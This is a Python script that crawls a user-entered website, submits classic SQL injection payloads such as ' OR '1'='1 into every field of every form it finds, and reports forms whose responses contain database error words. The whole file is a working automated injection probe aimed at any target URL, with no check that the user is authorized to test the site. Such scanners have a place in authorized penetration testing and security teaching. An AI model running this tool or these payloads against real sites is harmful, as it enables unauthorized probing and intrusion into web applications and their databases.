import requests
from bs4 import BeautifulSoup
from urllib.parse import urljoin, urlparse
import re

def find_forms(url):
    response = requests.get(url)
    soup = BeautifulSoup(response.text, 'html.parser')
    return soup.find_all('form')

def get_inputs(form):
    inputs = form.find_all('input')
    return {input.get('name'): input.get('value') for input in inputs if input.get('name')}

def submit_form(form, url, payload):
    action = form.get('action')
    post_url = urljoin(url, action)
    method = form.get('method').lower()
    inputs = get_inputs(form)

    for key in inputs.keys():
        inputs[key] = payload

    if method == 'post':
        return requests.post(post_url, data=inputs)
    else:
        return requests.get(post_url, params=inputs)

def scan_sql_injection(url):
    forms = find_forms(url)
    sql_payloads = [
        "'", "' OR '1'='1", "\" OR \"1\"=\"1", "' OR '1'='1' -- ", "\" OR \"1\"=\"1\" -- "
    ]
    vulnerable_forms = []

    for form in forms:
        for payload in sql_payloads:
            response = submit_form(form, url, payload)
            if re.search(r"(sql|mysql|error|syntax|database|query|statement)", response.text, re.IGNORECASE):
                vulnerable_forms.append((form, payload))
                break

    return vulnerable_forms

def crawl_and_scan(url, depth=1):
    if depth == 0:
        return

    forms = scan_sql_injection(url)
    if forms:
        print(f"[!] SQL Injection vulnerability detected on {url}")
        for form, payload in forms:
            print(f"[*] Form details: {form}")
            print(f"[*] Payload: {payload}")

    response = requests.get(url)
    soup = BeautifulSoup(response.text, 'html.parser')

    for link in soup.find_all('a', href=True):
        link_url = urljoin(url, link['href'])
        if urlparse(link_url).netloc == urlparse(url).netloc:
            crawl_and_scan(link_url, depth - 1)

if __name__ == "__main__":
    target_url = input("Enter the target URL (e.g., http://example.com): ")
    max_depth = int(input("Enter the maximum crawl depth: "))
    crawl_and_scan(target_url, max_depth)
